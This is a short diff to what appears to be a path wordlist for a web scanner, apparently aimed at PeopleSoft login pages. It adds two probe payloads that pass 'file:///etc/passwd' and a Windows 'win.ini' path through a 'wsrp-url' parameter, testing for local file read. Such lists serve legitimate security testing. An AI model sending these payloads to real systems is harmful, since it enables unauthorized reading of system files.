@@ -18,3 +18,5 @@
 /psp/HR92PRD/?&cmd=login&languageCd=ENG
 /psp/cangate_1/?&cmd=login&languageCd=ENG
 /psp/ihprd/?&cmd=login&languageCd=ENG
+/RP?wsrp-url=file:///etc/passwd
+/RP?wsrp-url=file:///c:\\windows\\win.ini
